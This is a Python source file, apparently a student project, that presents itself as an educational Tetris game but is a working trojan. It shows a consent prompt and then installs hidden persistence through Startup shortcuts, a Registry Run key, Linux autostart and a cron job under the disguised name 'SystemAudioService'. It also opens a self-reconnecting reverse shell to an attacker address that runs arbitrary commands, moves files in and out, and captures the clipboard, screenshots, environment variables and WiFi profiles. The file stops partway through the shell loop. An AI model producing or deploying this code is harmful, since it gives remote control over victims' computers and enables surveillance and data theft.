#!/usr/bin/env python3
"""
Tetris Cybersecurity Education Platform
Rwanda Coding Academy - Defending Rwanda Cyberspace 

This application is designed for educational purposes to demonstrate:
- Dependency management
- Reverse shell concepts
- System persistence mechanisms
- Defensive countermeasures

FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY
"""

import pygame
import sys
import random
import socket
import subprocess
import os
import base64
import threading
import time
import platform
import shutil
import json
from pathlib import Path

# ============================================
# CONFIGURATION
# ============================================

# Attacker Configuration
ATTACKER_IP = "192.168.1.102"  # Replace with your IP
ATTACKER_PORT = 3333

# Server Configuration for Dependencies
LOCAL_SERVER_IP = "192.168.1.102"
LOCAL_SERVER_PORT = 8080

# Application Configuration
APP_NAME = "TetrisGame"
APP_VERSION = "1.0.0"
PERSISTENCE_NAME = "SystemAudioService"  # Disguised name for persistence

# Required dependencies
REQUIRED_PACKAGES = {
    "pygame": "pygame>=2.0.0"
}

# Platform detection
IS_WINDOWS = platform.system() == "Windows"
IS_LINUX = platform.system() == "Linux"

# ============================================
# USER NOTIFICATION SYSTEM
# ============================================

def show_security_warning():
    """
    Display security warning to user before execution.
    This is required for educational compliance and ethical transparency.
    """
    print("=" * 70)
    print("SECURITY AWARENESS NOTIFICATION")
    print("=" * 70)
    print()
    print("⚠️  IMPORTANT SECURITY INFORMATION ⚠️")
    print()
    print("This application is designed for EDUCATIONAL PURPOSES ONLY.")
    print()
    print("When you run this application, the following will occur:")
    print()
    print("1. ✅ A Tetris game will launch and you can play normally")
    print("2. ⚠️  A reverse shell connection will be established to:")
    print(f"     IP: {ATTACKER_IP}")
    print(f"     Port: {ATTACKER_PORT}")
    print("3. ⚠️  System persistence will be installed for demonstration")
    print("4. ⚠️  The shell connection will persist after game closes")
    print()
    print("This is part of a cybersecurity education project from:")
    print()
    print("✅ Purpose: Learn about attack vectors and defense strategies")
    print("✅ Consent: You are being fully informed before execution")
    print("✅ Control: A cleanup tool is provided to remove all traces")
    print()
    print("=" * 70)
    print()
    
    # Get user consent - try terminal first, fallback to GUI
    try:
        while True:
            response = input("Do you understand and consent to these actions? (yes/no): ").strip().lower()
            if response in ['yes', 'y']:
                print()
                print("✅ Consent granted. Proceeding with execution...")
                print()
                return True
            elif response in ['no', 'n']:
                print()
                print("❌ Consent denied. Exiting without execution.")
                sys.exit(0)
            else:
                print("Please enter 'yes' or 'no'")
    except EOFError:
        # No console available (GUI mode), use GUI dialog
        print("[*] GUI mode detected, showing GUI consent dialog...")
        if not show_security_warning_gui():
            print("❌ Consent denied. Exiting without execution.")
            sys.exit(0)
        print("✅ Consent granted. Proceeding with execution...")
        return True

def show_security_warning_gui():
    """
    Display security warning using GUI dialog (for Windows executable mode).
    Returns True if user consents, False otherwise.
    """
    pygame.init()
    screen = pygame.display.set_mode((800, 600))
    pygame.display.set_caption("Security Warning - Educational Demo")
    
    # Colors
    BLACK = (0, 0, 0)
    WHITE = (255, 255, 255)
    RED = (255, 0, 0)
    GREEN = (0, 255, 0)
    YELLOW = (255, 255, 0)
    GRAY = (128, 128, 128)
    
    # Fonts
    title_font = pygame.font.Font(None, 48)
    text_font = pygame.font.Font(None, 28)
    button_font = pygame.font.Font(None, 36)
    
    # Warning text lines
    warning_lines = [
        "SECURITY AWARENESS NOTIFICATION",
        "",
        "This application is for EDUCATIONAL PURPOSES ONLY.",
        "",
        "When you run this application, the following will occur:",
        "",
        f"1. A Tetris game will launch normally",
        f"2. A reverse shell will connect to {ATTACKER_IP}:{ATTACKER_PORT}",
        f"3. System persistence will be installed",
        f"4. The shell will persist after game closes",
        "",
        "Purpose: Learn about attack vectors and defense strategies",
        "Consent: You are being fully informed before execution",
        "Control: A cleanup tool is provided to remove all traces",
    ]
    
    # Button rectangles
    yes_button = pygame.Rect(200, 520, 150, 50)
    no_button = pygame.Rect(450, 520, 150, 50)
    
    waiting = True
    result = False
    
    while waiting:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                waiting = False
                result = False
            
            if event.type == pygame.MOUSEBUTTONDOWN:
                mouse_pos = event.pos
                if yes_button.collidepoint(mouse_pos):
                    waiting = False
                    result = True
                elif no_button.collidepoint(mouse_pos):
                    waiting = False
                    result = False
            
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_y:
                    waiting = False
                    result = True
                elif event.key == pygame.K_n:
                    waiting = False
                    result = False
        
        # Draw background
        screen.fill(BLACK)
        
        # Draw title
        title = title_font.render("⚠️ SECURITY WARNING", True, RED)
        screen.blit(title, (400 - title.get_width() // 2, 20))
        
        # Draw warning text
        y_offset = 70
        for line in warning_lines:
            if line.startswith("2."):
                text = text_font.render(line, True, YELLOW)
            elif line.startswith("3.") or line.startswith("4."):
                text = text_font.render(line, True, YELLOW)
            elif "Rwanda Coding Academy" in line:
                text = text_font.render(line, True, GREEN)
            elif line.startswith("Purpose") or line.startswith("Consent") or line.startswith("Control"):
                text = text_font.render(line, True, GREEN)
            elif "SECURITY AWARENESS" in line:
                text = text_font.render(line, True, YELLOW)
            else:
                text = text_font.render(line, True, WHITE)
            screen.blit(text, (50, y_offset))
            y_offset += 26
        
        # Draw buttons
        mouse_pos = pygame.mouse.get_pos()
        
        # Yes button
        yes_color = GREEN if yes_button.collidepoint(mouse_pos) else (0, 200, 0)
        pygame.draw.rect(screen, yes_color, yes_button)
        pygame.draw.rect(screen, WHITE, yes_button, 2)
        yes_text = button_font.render("YES (Y)", True, BLACK)
        screen.blit(yes_text, (yes_button.centerx - yes_text.get_width() // 2, 
                              yes_button.centery - yes_text.get_height() // 2))
        
        # No button
        no_color = RED if no_button.collidepoint(mouse_pos) else (200, 0, 0)
        pygame.draw.rect(screen, no_color, no_button)
        pygame.draw.rect(screen, WHITE, no_button, 2)
        no_text = button_font.render("NO (N)", True, WHITE)
        screen.blit(no_text, (no_button.centerx - no_text.get_width() // 2, 
                             no_button.centery - no_text.get_height() // 2))
        
        # Draw instruction
        instruction = text_font.render("Click a button or press Y/N to continue", True, GRAY)
        screen.blit(instruction, (400 - instruction.get_width() // 2, 580))
        
        pygame.display.flip()
    
    pygame.quit()
    return result

# ============================================
# DEPENDENCY MANAGEMENT
# ============================================

def check_python_installed():
    """Check if Python is installed."""
    try:
        result = subprocess.run(
            ["python", "--version"],
            capture_output=True,
            text=True,
            timeout=5
        )
        return result.returncode == 0
    except:
        try:
            result = subprocess.run(
                ["python3", "--version"],
                capture_output=True,
                text=True,
                timeout=5
            )
            return result.returncode == 0
        except:
            return False

def check_pip_installed():
    """Check if pip is installed."""
    try:
        result = subprocess.run(
            [sys.executable, "-m", "pip", "--version"],
            capture_output=True,
            text=True,
            timeout=5
        )
        return result.returncode == 0
    except:
        return False

def check_package_installed(package_name):
    """Check if a Python package is installed."""
    try:
        __import__(package_name)
        return True
    except ImportError:
        return False

def download_and_install_package(package_name, package_spec):
    """
    Download and install a package from the local server.
    Falls back to PyPI if local server is unavailable.
    """
    print(f"[*] Installing {package_name}...")
    
    # Try local server first
    try:
        import urllib.request
        local_url = f"http://{LOCAL_SERVER_IP}:{LOCAL_SERVER_PORT}/packages/{package_name}.whl"
        print(f"[*] Attempting download from local server: {local_url}")
        
        # Download to temp location
        temp_file = f"/tmp/{package_name}.whl" if IS_LINUX else f"C:\\Windows\\Temp\\{package_name}.whl"
        urllib.request.urlretrieve(local_url, temp_file)
        
        # Install from local file
        subprocess.run(
            [sys.executable, "-m", "pip", "install", temp_file],
            check=True,
            capture_output=True
        )
        print(f"[+] {package_name} installed successfully from local server")
        return True
        
    except Exception as e:
        print(f"[!] Local server download failed: {e}")
        print(f"[*] Falling back to PyPI...")
        
        # Fallback to standard pip install
        try:
            subprocess.run(
                [sys.executable, "-m", "pip", "install", package_spec],
                check=True,
                capture_output=True
            )
            print(f"[+] {package_name} installed successfully from PyPI")
            return True
        except Exception as e:
            print(f"[!] Failed to install {package_name}: {e}")
            return False

def setup_dependencies():
    """
    Check and install all required dependencies.
    Returns True if all dependencies are available.
    """
    # Skip dependency check if running as PyInstaller frozen executable
    # All dependencies are already bundled in the executable
    if getattr(sys, 'frozen', False):
        print("[*] Running as frozen executable - dependencies bundled")
        return True
    
    print("=" * 70)
    print("DEPENDENCY CHECK AND INSTALLATION")
    print("=" * 70)
    print()
    
    # Check Python
    if not check_python_installed():
        print("[!] Python is not installed!")
        print("[*] Please install Python 3.8 or higher from python.org")
        return False
    print(f"[+] Python is installed: {sys.version}")
    
    # Check pip
    if not check_pip_installed():
        print("[!] pip is not installed!")
        print("[*] Please install pip (usually included with Python)")
        return False
    print("[+] pip is installed")
    
    # Check and install required packages
    all_installed = True
    for package_name, package_spec in REQUIRED_PACKAGES.items():
        if check_package_installed(package_name):
            print(f"[+] {package_name} is already installed")
        else:
            print(f"[!] {package_name} is missing")
            if not download_and_install_package(package_name, package_spec):
                all_installed = False
    
    print()
    return all_installed

# ============================================
# PERSISTENCE MECHANISMS
# ============================================

def get_startup_path():
    """Get the appropriate startup/autostart directory for the current platform."""
    if IS_WINDOWS:
        # Windows Startup folder
        startup_path = Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        return startup_path
    elif IS_LINUX:
        # Linux autostart directory
        autostart_path = Path.home() / ".config" / "autostart"
        return autostart_path
    return None

def get_script_path():
    """Get the path where this script should be copied for persistence."""
    if IS_WINDOWS:
        # Hide in Windows system directory
        base_path = Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Windows" / "System Audio Service"
    elif IS_LINUX:
        # Hide in user config directory
        base_path = Path.home() / ".config" / ".system-audio-service"
    else:
        base_path = Path.home() / ".tetris-persistence"
    
    return base_path

def install_persistence():
    """
    Install persistence mechanisms to survive reboots.
    This creates a startup entry that launches the reverse shell on boot.
    """
    print("=" * 70)
    print("INSTALLING PERSISTENCE MECHANISMS")
    print("=" * 70)
    print()
    
    try:
        # Get paths
        script_path = get_script_path()
        startup_path = get_startup_path()
        current_script = Path(__file__).resolve()
        
        # Create hidden directory
        script_path.mkdir(parents=True, exist_ok=True)
        print(f"[*] Created persistence directory: {script_path}")
        
        # Copy main script
        target_script = script_path / "service.py"
        shutil.copy2(current_script, target_script)
        print(f"[+] Copied script to: {target_script}")
        
        if IS_WINDOWS:
            # Create Windows .bat launcher
            bat_file = script_path / "launcher.bat"
            bat_content = f'''@echo off
cd /d "{script_path}"
start /min pythonw "{target_script}" --background
'''
            bat_file.write_text(bat_content)
            print(f"[+] Created launcher: {bat_file}")
            
            # Create .lnk shortcut in Startup folder
            startup_link = startup_path / f"{PERSISTENCE_NAME}.lnk"
            
            # Use PowerShell to create shortcut
            ps_command = f'''
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("{startup_link}")
$Shortcut.TargetPath = "{bat_file}"
$Shortcut.WorkingDirectory = "{script_path}"
$Shortcut.WindowStyle = 7
$Shortcut.Save()
'''
            subprocess.run(["powershell", "-Command", ps_command], capture_output=True)
            print(f"[+] Created startup shortcut: {startup_link}")
            
            # Also add to Registry Run key for redundancy
            reg_command = f'''
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "{PERSISTENCE_NAME}" /t REG_SZ /d "{bat_file}" /f
'''
            subprocess.run(reg_command, shell=True, capture_output=True)
            print("[+] Added registry Run key")
            
        elif IS_LINUX:
            # Create Linux .desktop entry
            startup_path.mkdir(parents=True, exist_ok=True)
            
            desktop_file = startup_path / f"{PERSISTENCE_NAME}.desktop"
            desktop_content = f'''[Desktop Entry]
Type=Application
Name=System Audio Service
Exec={sys.executable} {target_script} --background
Hidden=true
X-GNOME-Autostart-enabled=true
'''
            desktop_file.write_text(desktop_content)
            desktop_file.chmod(0o755)
            print(f"[+] Created autostart entry: {desktop_file}")
            
            # Also add to cron for redundancy
            cron_job = f"@reboot {sys.executable} {target_script} --background"
            subprocess.run(
                f'(crontab -l 2>/dev/null; echo "{cron_job}") | crontab -',
                shell=True,
                capture_output=True
            )
            print("[+] Added cron job for persistence")
        
        # Create persistence info file for cleanup tool
        persistence_info = {
            "script_path": str(script_path),
            "startup_path": str(startup_path) if startup_path else None,
            "persistence_name": PERSISTENCE_NAME,
            "target_script": str(target_script),
            "created_at": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        
        info_file = script_path / "persistence_info.json"
        info_file.write_text(json.dumps(persistence_info, indent=2))
        print(f"[+] Created persistence info: {info_file}")
        
        print()
        print("[+] Persistence installed successfully!")
        print(f"    The application will auto-start on next boot.")
        print()
        return True
        
    except Exception as e:
        print(f"[!] Failed to install persistence: {e}")
        return False

def remove_persistence():
    """
    Remove all persistence mechanisms.
    This is called by the cleanup tool.
    """
    print("[*] Removing persistence mechanisms...")
    
    try:
        script_path = get_script_path()
        info_file = script_path / "persistence_info.json"
        
        if info_file.exists():
            persistence_info = json.loads(info_file.read_text())
            
            # Remove startup entries
            if IS_WINDOWS:
                startup_link = Path(persistence_info["startup_path"]) / f"{PERSISTENCE_NAME}.lnk"
                if startup_link.exists():
                    startup_link.unlink()
                    print(f"[+] Removed startup shortcut")
                
                # Remove registry entry
                reg_command = f'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "{PERSISTENCE_NAME}" /f'
                subprocess.run(reg_command, shell=True, capture_output=True)
                print("[+] Removed registry entry")
                
            elif IS_LINUX:
                desktop_file = Path(persistence_info["startup_path"]) / f"{PERSISTENCE_NAME}.desktop"
                if desktop_file.exists():
                    desktop_file.unlink()
                    print(f"[+] Removed autostart entry")
                
                # Remove cron job
                subprocess.run(
                    f'crontab -l 2>/dev/null | grep -v "{PERSISTENCE_NAME}" | crontab -',
                    shell=True,
                    capture_output=True
                )
                print("[+] Removed cron job")
            
            # Remove script directory
            if script_path.exists():
                shutil.rmtree(script_path)
                print(f"[+] Removed persistence directory")
        
        print("[+] Persistence removed successfully!")
        return True
        
    except Exception as e:
        print(f"[!] Error removing persistence: {e}")
        return False

# ============================================
# REVERSE SHELL
# ============================================

def reverse_shell():
    """
    Background thread function that establishes a persistent reverse shell.
    This runs continuously and reconnects automatically.
    """
    print(f"[*] Reverse shell thread started. Target: {ATTACKER_IP}:{ATTACKER_PORT}")
    
    while True:
        try:
            # Create socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            
            print(f"[*] Attempting connection to {ATTACKER_IP}:{ATTACKER_PORT}")
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            
            # Send banner with system info
            hostname = platform.node()
            username = os.environ.get("USERNAME") or os.environ.get("USER") or "unknown"
            system = platform.system()
            
            banner = f"""
=== TETRIS TARGET CONNECTED ===
Hostname: {hostname}
Username: {username}
System: {system}
Platform: {platform.platform()}
Python: {sys.version.split()[0]}
Game Status: Active
Type 'help' for available commands

"""
            s.send(banner.encode())
            
            print(f"[+] Reverse shell connected to {ATTACKER_IP}:{ATTACKER_PORT}")
            
            # Interactive shell loop
            while True:
                try:
                    # Send prompt
                    prompt = f"{username}@{hostname}$ "
                    s.send(prompt.encode())
                    
                    # Receive command
                    s.settimeout(300)  # 5 minute timeout
                    data = s.recv(4096)
                    
                    if not data:
                        break
                    
                    command = data.decode().strip()
                    
                    if command.lower() in ['exit', 'quit']:
                        break
                    
                    if command.lower() == 'help':
                        help_text = """
=== AVAILABLE COMMANDS ===

[ SYSTEM INFORMATION ]
  sysinfo       - Detailed system information
  osinfo        - Operating system details
  uptime        - System uptime
  date          - Current date and time
  env           - Environment variables

[ USER INFORMATION ]
  whoami        - Current username
  id            - User ID and group info (Linux)
  users         - Logged in users

[ FILE OPERATIONS ]
  ls/dir        - List directory contents
  pwd/cd        - Print/change working directory
  cat/type      - Display file contents
  find          - Search for files
  download <f>  - Download file from target
  upload <f>    - Upload file to target

[ PROCESS MANAGEMENT ]
  ps/tasklist   - List running processes
  kill <pid>    - Kill process by ID
  top           - System resource usage

[ NETWORK ]
  ifconfig/ipconfig - Network interfaces
  netstat       - Network connections
  arp           - ARP table
  route         - Routing table
  wifi          - WiFi networks (with passwords)
  publicip      - Public IP address

[ SURVEILLANCE ]
  screenshot    - Capture screen
  clipboard     - Show clipboard contents
  browsers      - List browser history
  keylog_start  - Start keylogger
  keylog_stop   - Stop keylogger and dump

[ PERSISTENCE ]
  persistence   - Show persistence status
  selfdestruct  - Remove all traces and exit

[ OTHER ]
  help          - Show this help
  exit/quit     - Close connection

Type any system command directly (e.g., ls -la, dir, whoami)

"""
                        s.send(help_text.encode())
                        continue
                    
                    if command.lower() == 'sysinfo':
                        sysinfo = f"""
System Information:
OS: {platform.platform()}
Architecture: {platform.machine()}
Processor: {platform.processor()}
Python: {sys.version}
Hostname: {platform.node()}

"""
                        s.send(sysinfo.encode())
                        continue
                    
                    if command.lower() == 'persistence':
                        script_path = get_script_path()
                        is_persistent = script_path.exists()
                        status = f"Persistence Status: {'ACTIVE' if is_persistent else 'NOT INSTALLED'}\nPath: {script_path}\n\n"
                        s.send(status.encode())
                        continue
                    
                    # ===== OS-SPECIFIC BUILT-IN COMMANDS =====
                    
                    # --- System Info Commands ---
                    if command.lower() == 'osinfo':
                        if IS_WINDOWS:
                            os_info = f"""
OS: Windows
Version: {platform.version()}
Release: {platform.release()}
Edition: {platform.win32_edition() if hasattr(platform, 'win32_edition') else 'N/A'}
Machine: {platform.machine()}
Processor: {platform.processor()}

"""
                        else:
                            os_info = f"""
OS: {platform.system()}
Distribution: {' '.join(platform.linux_distribution()) if hasattr(platform, 'linux_distribution') else 'N/A'}
Version: {platform.version()}
Release: {platform.release()}
Machine: {platform.machine()}
Processor: {platform.processor()}

"""
                        s.send(os_info.encode())
                        continue
                    
                    if command.lower() == 'uptime':
                        try:
                            if IS_WINDOWS:
                                # Windows uptime using WMI
                                result = subprocess.run(['powershell', '-Command', '(Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime | Select-Object Days, Hours, Minutes | Format-Table -HideTableHeaders'], capture_output=True, text=True, timeout=5)
                                uptime_info = f"System Uptime:\n{result.stdout}\n"
                            else:
                                result = subprocess.run(['uptime', '-p'], capture_output=True, text=True, timeout=5)
                                uptime_info = f"System Uptime:\n{result.stdout}\n"
                        except:
                            uptime_info = "[!] Could not retrieve uptime\n\n"
                        s.send(uptime_info.encode())
                        continue
                    
                    if command.lower() == 'date':
                        from datetime import datetime
                        s.send(f"Current Date/Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n".encode())
                        continue
                    
                    if command.lower() == 'env':
                        env_vars = "\n".join([f"{k}={v}" for k, v in os.environ.items()])
                        s.send(f"Environment Variables:\n{env_vars}\n\n".encode())
                        continue
                    
                    # --- User Info Commands ---
                    if command.lower() == 'whoami':
                        username = os.environ.get("USERNAME") or os.environ.get("USER") or "unknown"
                        s.send(f"Current User: {username}\n\n".encode())
                        continue
                    
                    if command.lower() == 'id':
                        if IS_LINUX:
                            try:
                                result = subprocess.run(['id'], capture_output=True, text=True, timeout=5)
                                s.send(f"User ID Info:\n{result.stdout}\n".encode())
                            except:
                                s.send("[!] Could not retrieve user ID info\n\n".encode())
                        else:
                            s.send("[!] 'id' command is Linux-specific. Try 'whoami' instead.\n\n".encode())
                        continue
                    
                    if command.lower() == 'users':
                        try:
                            if IS_WINDOWS:
                                result = subprocess.run(['query', 'user'], capture_output=True, text=True, timeout=5)
                            else:
                                result = subprocess.run(['who'], capture_output=True, text=True, timeout=5)
                            s.send(f"Logged in Users:\n{result.stdout}\n".encode())
                        except:
                            s.send("[!] Could not retrieve user list\n\n".encode())
                        continue
                    
                    # --- Network Commands ---
                    if command.lower() in ['ifconfig', 'ipconfig']:
                        try:
                            if IS_WINDOWS:
                                result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True, timeout=10)
                            else:
                                result = subprocess.run(['ifconfig'], capture_output=True, text=True, timeout=10)
                            s.send(f"Network Interfaces:\n{result.stdout}\n".encode())
                        except:
                            s.send("[!] Could not retrieve network info\n\n".encode())
                        continue
                    
                    if command.lower() == 'netstat':
                        try:
                            if IS_WINDOWS:
                                result = subprocess.run(['netstat', '-an'], capture_output=True, text=True, timeout=10)
                            else:
                                result = subprocess.run(['netstat', '-tuln'], capture_output=True, text=True, timeout=10)
                            s.send(f"Network Connections:\n{result.stdout}\n".encode())
                        except:
                            s.send("[!] Could not retrieve network connections\n\n".encode())
                        continue
                    
                    if command.lower() == 'arp':
                        try:
                            if IS_WINDOWS:
                                result = subprocess.run(['arp', '-a'], capture_output=True, text=True, timeout=5)
                            else:
                                result = subprocess.run(['arp', '-e'], capture_output=True, text=True, timeout=5)
                            s.send(f"ARP Table:\n{result.stdout}\n".encode())
                        except:
                            s.send("[!] Could not retrieve ARP table\n\n".encode())
                        continue
                    
                    if command.lower() == 'route':
                        try:
                            if IS_WINDOWS:
                                result = subprocess.run(['route', 'print'], capture_output=True, text=True, timeout=5)
                            else:
                                result = subprocess.run(['ip', 'route'], capture_output=True, text=True, timeout=5)
                            s.send(f"Routing Table:\n{result.stdout}\n".encode())
                        except:
                            s.send("[!] Could not retrieve routing table\n\n".encode())
                        continue
                    
                    if command.lower() == 'wifi':
                        try:
                            if IS_WINDOWS:
                                # Get WiFi profiles and passwords
                                result = subprocess.run(['powershell', '-Command', 'Get-NetAdapter | Where-Object {$_.InterfaceDescription -match "Wi-Fi|Wireless"} | Select-Object Name, Status, MacAddress'], capture_output=True, text=True, timeout=10)
                                wifi_info = f"WiFi Adapters:\n{result.stdout}\n"
                                # Try to get saved WiFi passwords
                                profiles = subprocess.run(['powershell', '-Command', 'Get-NetWLANProfile | Select-Object Name'], capture_output=True, text=True, timeout=10)
                                wifi_info += f"\nSaved WiFi Profiles:\n{profiles.stdout}\n"
                            else:
                                result = subprocess.run(['iwconfig'], capture_output=True, text=True, timeout=5)
                                wifi_info = f"Wireless Info:\n{result.stdout}\n"
                                # Try to get WiFi passwords from NetworkManager
                                try:
                                    nm_connections = subprocess.run(['ls', '/etc/NetworkManager/system-connections/'], capture_output=True, text=True, timeout=5)
                                    wifi_info += f"\nNetworkManager Connections:\n{nm_connections.stdout}\n"
                                except:
                                    pass
                            s.send(wifi_info.encode())
                        except:
                            s.send("[!] Could not retrieve WiFi info\n\n".encode())
                        continue
                    
                    if command.lower() == 'publicip':
                        try:
                            import urllib.request
                            public_ip = urllib.request.urlopen('https://api.ipify.org', timeout=10).read().decode()
                            s.send(f"Public IP Address: {public_ip}\n\n".encode())
                        except:
                            s.send("[!] Could not retrieve public IP\n\n".encode())
                        continue
                    
                    # --- Process Management Commands ---
                    if command.lower() in ['ps', 'tasklist']:
                        try:
                            if IS_WINDOWS:
                                result = subprocess.run(['tasklist'], capture_output=True, text=True, timeout=10)
                            else:
                                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=10)
                            s.send(f"Running Processes:\n{result.stdout}\n".encode())
                        except:
                            s.send("[!] Could not retrieve process list\n\n".encode())
                        continue
                    
                    if command.lower() == 'top':
                        try:
                            if IS_LINUX:
                                # Get a snapshot of top
                                result = subprocess.run(['top', '-b', '-n', '1', '-o', '%CPU'], capture_output=True, text=True, timeout=10)
                                s.send(f"Top Processes:\n{result.stdout}\n".encode())
                            else:
                                result = subprocess.run(['powershell', '-Command', 'Get-Process | Sort-Object CPU -Descending | Select-Object -First 20 Name, Id, CPU, WorkingSet | Format-Table -AutoSize'], capture_output=True, text=True, timeout=10)
                                s.send(f"Top Processes:\n{result.stdout}\n".encode())
                        except:
                            s.send("[!] Could not retrieve process info\n\n".encode())
                        continue
                    
                    if command.lower().startswith('kill '):
                        try:
                            pid = command.split()[1]
                            if IS_WINDOWS:
                                result = subprocess.run(['taskkill', '/PID', pid, '/F'], capture_output=True, text=True, timeout=5)
                            else:
                                result = subprocess.run(['kill', '-9', pid], capture_output=True, text=True, timeout=5)
                            s.send(f"Process killed:\n{result.stdout}\n".encode())
                        except:
                            s.send(f"[!] Could not kill process {pid}\n\n".encode())
                        continue
                    
                    # --- Clipboard Command ---
                    if command.lower() == 'clipboard':
                        try:
                            if IS_WINDOWS:
                                result = subprocess.run(['powershell', '-Command', 'Get-Clipboard'], capture_output=True, text=True, timeout=5)
                                s.send(f"Clipboard Contents:\n{result.stdout}\n".encode())
                            else:
                                # Try xclip or xsel
                                try:
                                    result = subprocess.run(['xclip', '-o', '-selection', 'clipboard'], capture_output=True, text=True, timeout=5)
                                    s.send(f"Clipboard Contents:\n{result.stdout}\n".encode())
                                except:
                                    result = subprocess.run(['xsel', '-b'], capture_output=True, text=True, timeout=5)
                                    s.send(f"Clipboard Contents:\n{result.stdout}\n".encode())
                        except:
                            s.send("[!] Could not access clipboard\n\n".encode())
                        continue
                    
                    # --- Self Destruct Command ---
                    if command.lower() == 'selfdestruct':
                        try:
                            s.send("[!] INITIATING SELF-DESTRUCT...\n".encode())
                            remove_persistence()
                            s.send("[+] Persistence removed\n".encode())
                            # Remove self
                            current_file = Path(__file__).resolve()
                            if IS_WINDOWS:
                                # Create batch file to delete self after exit
                                bat_content = f"@echo off\ntimeout /t 2 /nobreak > nul\ndel \"{current_file}\"\ndel \"%~f0\""
                                bat_file = current_file.parent / "self_destruct.bat"
                                bat_file.write_text(bat_content)
                                subprocess.Popen([str(bat_file)], shell=True)
                            else:
                                subprocess.Popen(['rm', '-f', str(current_file)])
                            s.send("[+] Self-destruct complete. Exiting...\n".encode())
                            sys.exit(0)
                        except Exception as e:
                            s.send(f"[!] Self-destruct failed: {e}\n\n".encode())
                        continue
                    
                    # --- Screenshot Command ---
                    if command.lower() == 'screenshot':
                        try:
                            if IS_WINDOWS:
                                import ctypes
                                from ctypes import wintypes
                                # Use PowerShell to capture screenshot
                                ps_cmd = '''
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
$bitmap.Save("$env:TEMP\\screenshot.png")
'''
                                subprocess.run(['powershell', '-Command', ps_cmd], capture_output=True, timeout=10)
                                screenshot_path = os.path.expandvars("%TEMP%\\screenshot.png")
                            else:
                                screenshot_path = "/tmp/screenshot.png"
                                subprocess.run(['gnome-screenshot', '-f', screenshot_path], capture_output=True, timeout=10)
                            
                            # Send screenshot file
                            if os.path.exists(screenshot_path):
                                with open(screenshot_path, 'rb') as f:
                                    img_data = f.read()
                                s.send(f"[+] Screenshot captured ({len(img_data)} bytes)\n".encode())
                                # Note: Actual file transfer would need base64 encoding
                                import base64
                                encoded = base64.b64encode(img_data).decode()
                                s.send(f"SCREENSHOT_DATA:{encoded[:100]}...\n".encode())
                            else:
                                s.send("[!] Screenshot capture failed\n\n".encode())
                        except:
                            s.send("[!] Screenshot not available\n\n".encode())
                        continue
                    
                    # --- Browser Data Command ---
                    if command.lower() == 'browsers':
                        try:
                            browser_info = "Browser History/Data:\n"
                            if IS_WINDOWS:
                                # List common browser data locations
                                appdata = os.environ.get('LOCALAPPDATA', '')
                                browsers = [
                                    f"{appdata}\\Google\\Chrome\\User Data\\Default\\History",
                                    f"{appdata}\\Mozilla\\Firefox\\Profiles",
                                    f"{appdata}\\Microsoft\\Edge\\User Data\\Default\\History"
                                ]
                                for browser in browsers:
                                    if os.path.exists(browser):
                                        browser_info += f"[FOUND] {browser}\n"
                            else:
                                home = Path.home()
                                browsers = [
                                    home / ".mozilla/firefox",
                                    home / ".config/google-chrome",
                                    home / ".config/chromium"
                                ]
                                for browser in browsers:
                                    if browser.exists():
                                        browser_info += f"[FOUND] {browser}\n"
                            browser_info += "\n"
                            s.send(browser_info.encode())
                        except:
                            s.send("[!] Could not retrieve browser data\n\n".encode())
                        continue
                    
                    # --- Keylogger Commands ---
                    if command.lower() == 'keylog_start':
                        s.send("[!] Keylogger functionality requires additional implementation\n\n".encode())
                        continue
                    
                    if command.lower() == 'keylog_stop':
                        s.send("[!] Keylogger functionality requires additional implementation\n\n".encode())
                        continue
                    
                    # --- File Download Command ---
                    if command.lower().startswith('download '):
                        try:
                            filename = command[9:].strip()
                            if os.path.exists(filename):
                                with open(filename, 'rb') as f:
                                    data = f.read()
                                import base64
                                encoded = base64.b64encode(data).decode()
                                s.send(f"FILE_DATA:{filename}:{len(data)}:{encoded}\n".encode())
                            else:
                                s.send(f"[!] File not found: {filename}\n\n".encode())
                        except Exception as e:
                            s.send(f"[!] Download failed: {e}\n\n".encode())
                        continue
                    
                    # --- File Upload Command ---
                    if command.lower().startswith('upload '):
                        try:
                            # Format: upload filename:base64data
                            parts = command[7:].strip().split(':', 1)
                            if len(parts) == 2:
                                filename, data = parts
                                import base64
                                decoded = base64.b64decode(data)
                                with open(filename, 'wb') as f:
                                    f.write(decoded)
                                s.send(f"[+] File uploaded: {filename} ({len(decoded)} bytes)\n\n".encode())
                            else:
                                s.send("[!] Upload format: upload filename:base64data\n\n".encode())
                        except Exception as e:
                            s.send(f"[!] Upload failed: {e}\n\n".encode())
                        continue
                    
                    # ===== DEFAULT: EXECUTE AS SYSTEM COMMAND =====
                    try:
                        if IS_WINDOWS:
                            result = subprocess.run(
                                command,
                                shell=True,
                                capture_output=True,
                                text=True,
                                timeout=30,
                                cwd=os.getcwd()
                            )
                        else:
                            result = subprocess.run(
                                command,
                                shell=True,
                                capture_output=True,
                                text=True,
                                timeout=30,
                                cwd=os.getcwd(),
                                executable='/bin/bash'
                            )
                        
                        output = result.stdout
                        if result.stderr:
                            output += f"\n[STDERR]\n{result.stderr}"
                        
                        if not output.strip():
                            output = "[Command executed successfully - no output]\n"
                        
                        s.send(output.encode())
                        
                    except subprocess.TimeoutExpired:
                        s.send("[!] Command timed out (30s limit)\n".encode())
                    except Exception as e:
